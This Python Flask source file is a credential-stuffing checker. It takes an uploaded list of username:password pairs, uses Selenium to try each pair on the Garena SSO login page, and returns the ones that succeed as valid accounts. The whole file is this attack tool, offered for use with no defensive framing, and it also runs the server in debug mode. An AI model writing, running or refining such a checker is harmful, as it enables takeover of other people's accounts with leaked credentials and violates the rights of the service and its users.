from flask import Flask, request, jsonify
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service

app = Flask(__name__)

# Path to your WebDriver
CHROME_DRIVER_PATH = "path_to_chromedriver"  # Replace with actual path

def check_account(username, password):
    """Check if the username and password are valid using Selenium."""
    driver = webdriver.Chrome(service=Service(CHROME_DRIVER_PATH))
    login_url = "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=id-ID"
    driver.get(login_url)
    try:
        driver.find_element(By.ID, "username").send_keys(username)
        driver.find_element(By.ID, "password").send_keys(password + Keys.RETURN)
        driver.implicitly_wait(5)

        if "dashboard" in driver.current_url or "success" in driver.page_source:
            driver.quit()
            return True
        else:
            driver.quit()
            return False
    except:
        driver.quit()
        return False

@app.route("/validate", methods=["POST"])
def validate_accounts():
    if "accounts_file" not in request.files:
        return jsonify({"error": "No file uploaded."}), 400

    file = request.files["accounts_file"]
    accounts = file.read().decode("utf-8").splitlines()

    valid_accounts = []

    for account in accounts:
        if ":" not in account:
            continue
        username, password = account.split(":", 1)
        if check_account(username.strip(), password.strip()):
            valid_accounts.append(account)

    return jsonify({"validAccounts": valid_accounts})

if __name__ == "__main__":
    app.run(debug=True, port=5000)
